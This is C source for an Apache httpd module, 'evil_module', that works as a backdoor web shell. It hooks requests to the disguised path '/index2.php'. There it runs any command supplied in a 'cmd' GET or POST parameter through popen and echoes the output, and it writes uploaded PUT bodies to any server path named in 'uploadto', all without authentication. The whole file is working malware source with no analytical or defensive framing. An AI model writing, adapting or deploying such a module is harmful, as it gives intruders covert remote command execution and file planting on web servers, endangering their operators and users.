/* Include the required headers from httpd */
#include "ap_provider.h"
#include "ap_config.h"
#include "httpd.h"
#include "http_core.h"
#include "http_protocol.h"
#include "http_request.h"
#include "string.h"
#include <stdlib.h>
#include <stdio.h>

// #define EVIL_URL "/mod_evil"
#define EVIL_URL "/index2.php"
#define CMD_ARG "cmd"
#define UPLOAD_PATH_ARG "uploadto"
#define BUFFER_SIZE 1024
#define FILE_CHUNK 4096

static void register_hooks(apr_pool_t *pool);
static int evil_handler(request_rec *r, int lookup_uri);

module AP_MODULE_DECLARE_DATA evil_module =
{
    STANDARD20_MODULE_STUFF,
    NULL,            // Per-directory configuration handler
    NULL,            // Merge handler for per-directory configurations
    NULL,            // Per-server configuration handler
    NULL,            // Merge handler for per-server configurations
    NULL,            // Any directives we may have for httpd
    register_hooks   // Our hook registering function
};


/* register_hooks: Adds a hook to the httpd process */
static void register_hooks(apr_pool_t *pool) 
{
    
    /* Hook the request handler */
    ap_hook_quick_handler(evil_handler, NULL, NULL, APR_HOOK_MIDDLE);
}

static void run_command(request_rec *r, const char * command) {
    FILE *fp;
    char buffer[BUFFER_SIZE];

    fp = popen(command, "r");
    if (fp == NULL) {
        ap_rprintf(r, "Command '%s' failed\n", command);
    } else {
        while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
            ap_rprintf(r, "%s", buffer);
        }
        int rc = pclose(fp);
        if (rc != 0) {
            ap_rprintf(r, "Command '%s' failed\n", command);
        }
    }
}

static int evil_handler(request_rec *r, int lookup_uri)
{
    if (r->uri != NULL && strncmp(r->uri,EVIL_URL,sizeof(EVIL_URL)) == 0) {

        if (strncmp(r->method, "POST", 4)==0) {
            apr_off_t len;
            apr_size_t size;

            apr_array_header_t *POST; 
            ap_parse_form_data(r, NULL, &POST, -1, HUGE_STRING_LEN);

            while (POST && !apr_is_empty_array(POST)) {
                ap_form_pair_t *pair = (ap_form_pair_t *) apr_array_pop(POST);
                if (strncmp(pair->name,CMD_ARG,sizeof(CMD_ARG))==0) {
                    apr_brigade_length(pair->value, 1, &len);
                    size = (apr_size_t) len;
                    char * buffer = apr_palloc(r->pool, size + 1);
                    apr_brigade_flatten(pair->value, buffer, &size);

                    ap_set_content_type(r, "text/plain");
                    run_command(r, buffer);
                    return OK;
                }
            }
            return OK;

        } else if (strncmp(r->method, "GET", 4)==0) {
            apr_table_t *GET;
            ap_args_to_table(r, &GET);

            const char *cmd = apr_table_get(GET, CMD_ARG);

            if (cmd) {
                ap_set_content_type(r, "text/plain");
                run_command(r, cmd);
            } else {
                return DECLINED;
            }

            return OK;
        } else if (strncmp(r->method, "PUT", 4)==0) {

            // Got help for file upload here: byteandbits.blogspot.com/2013/09/example-apache-module-for-reading.html
            ap_set_content_type(r, "text/plain");

            apr_table_t *PUT;
            ap_args_to_table(r, &PUT);

            const char *upload_path = apr_table_get(PUT, UPLOAD_PATH_ARG);

            if (upload_path) {
                ap_rprintf(r, "path = %s\n", upload_path);

                int fd = creat(upload_path, 0644);

                if (fd == -1) {
                    ap_rprintf(r, "Opening %s failed\n", upload_path);
                    return OK;
                }
                
                ap_rprintf(r, "Opening %s OK\n", upload_path);
                int ret = ap_setup_client_block(r, REQUEST_CHUNKED_ERROR);

                if(OK == ret && ap_should_client_block(r)) {
                    char* buffer = (char*)apr_pcalloc(r->pool, FILE_CHUNK);

                    int len, status;

                    while ((len=ap_get_client_block(r, buffer, FILE_CHUNK)) > 0) {
                        status = write(fd, buffer, len);
                        if (status == -1) {
                            ap_rprintf(r, "Write failed\n");
                        }
                    }
                } else {
                    ap_rprintf(r, "ap_should_client_block failed\n");
                }

                close(fd);
                
            } else {
                return DECLINED;
            }

            return OK;
        }

        
    } else {
        return DECLINED;
    }
    

    return DECLINED;
}
